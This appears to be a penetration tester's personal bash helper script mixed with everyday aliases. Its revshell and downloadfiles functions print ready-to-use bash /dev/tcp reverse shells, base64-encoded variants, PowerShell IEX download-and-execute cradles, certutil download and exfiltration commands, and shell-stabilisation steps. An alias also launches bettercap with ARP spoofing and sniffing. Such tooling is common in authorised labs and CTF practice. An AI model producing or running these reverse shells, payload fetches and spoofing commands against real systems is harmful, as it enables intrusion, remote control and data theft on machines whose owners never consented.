#!/bin/bash

# TODO: meterpreter menu

function is_empty {
  thing=$1
  if [ $( echo -n "$thing" | wc -c ) == 0 ]; then
    return 0
  fi
  return 1
}

function prefer_order {
  token=$1
  tf=$(mktemp)
  tee $tf | grep "$token"
  grep -v $token $tf
  rm $tf
}

# TODO: try to repace ugly things with is_empty
function getmyip {
  iface=$1
  ifacestf=$(mktemp)

  if [ -z "$iface" ]; then
    ip l | grep -E '^[[:digit:]]+: ' | cut -d ':' -f 2 | awk '{print $1}' > $ifacestf
    tunifaces=$(cat $ifacestf | grep '^tun')
    # if there's one single tun interface, grab it
    if [ $(echo "$tunifaces" | wc -l) == 1 ]; then
      export iface=$tunifaces
    fi
    # if we still can't find it, ask
    if [ -z "$iface" ]; then
      export iface=$(cat $ifacestf | fzf)
    fi
    rm $ifacestf
  fi
  ip a s $iface | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1
}

function draw_bar {
  echo "===================================================================================================="
}

function do_title_bar {
  echo ""
  echo "===================================================================================================="
  figlet -f miniwi "$1" | lolcat
}

function downloadfiles {
  url=$1

  do_title_bar "windows files"
  echo "# DOS" | lolcat
  echo "certutil.exe -urlcache -split -f \"$url\" filename.exe"
  echo ""

  echo "# Powershell get file" | lolcat
  echo "wget \"$url\" -outfile filename.exe"
  echo "Invoke-WebRequest \"$url\" -outfile filename.exe"
  echo ""

  echo "# base64 xfer/exfil" | lolcat
  echo "certutil -encode exfil_file.dat exfil.b64"
  echo "certutil -decode payload.b64 payload.exe"
  echo ""
}

# TODO: use someone's script who already did the rest
function revshell {
  lhost=$(getmyip)
  lport=$1
  if [ -z "$lport" ]; then
    echo LPORT is empty
    echo "Usage: $0 [LPORT]"
    export lport=1234
  fi

  do_title_bar "linux rev shell"

  bashshell=$(echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1")
  echo "$bashshell"
  echo "bash -c '$bashshell'"
  echo "echo \"$(echo "$bashshell" | base64)\" | base64 -d | bash"

  do_title_bar "windows rev shell"

  echo "# Powershell execute script (like a reverse shell)" | lolcat
  echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
  echo ""

  downloadfiles "http://$lhost:$lport/filename.exe"

do_title_bar  "windows encoding"
  echo "# Powershell encoded command (hacktricks)" | lolcat
  cat << EOF
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
EOF
  echo ""
}

function stabshell {
  do_title_bar "stabilize linux shell"
  cat << EOF
python3 -c 'import pty;pty.spawn("/bin/bash")'
[ctrl] [z]
stty size
stty raw -echo; fg
[enter] [enter]

EOF
  stty size | awk '{print "stty rows",$1,"cols", $2}'
  echo "export TERM=xterm-256color"
  echo "export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin"
}

function breakout {
  stabshell
  revshell
}

# select ubuntu version, build docker in the current directory with gcc installed
function build_it_in_ubuntu_docker {
  tag=$1
  if is_empty $tag; then
    export tag=$(~/kb/docker/get-tags.sh ubuntu | fzf --prompt="select tag")
  fi
  ~/kb/docker/templates/ubuntu-dockerfile-template.sh $tag > Dockerfile 
  docker build . -t test
  docker run -it -v "$(pwd):$(pwd)" -w "$(pwd)" test
}

# Add this to your .bashrc, .zshrc or equivalent.
# Run 'fff' with 'f' or whatever you decide to name the function.
f() {
    EDITOR=nvim fff "$@"
    cd "$(cat "${XDG_CACHE_HOME:=${HOME}/.cache}/fff/.fff_d")"
}

alias g=lazygit
alias q=exit
alias v='nvim $(fzf --preview="bat --color=always {}")'
alias http='python3 -m http.server'
alias t='tmux a -t $(tmux ls | fzf| cut -d ":" -f 1) || tmux'
alias k='~/tmux-scripts/kb.sh no'
alias common='bat --style=plain --paging=never ~/kb/hacking/common-commands.md'
alias ttl='~/tmux-scripts/markdown-vivid.sh ~/kb/hacking/to-try-list.md'
alias a='sudo apt install -y $(apt list 2>/dev/null | fzf | cut -d '/' -f 1)'
alias bc='sudo bettercap -autostart events.stream,net.recon,net.sniff,net.probe,arp.spoof,any.proxy'

export PATH=$PATH:/usr/share/hashcat-utils

# turn bash prompt into vi edit with Esc
set -o vi
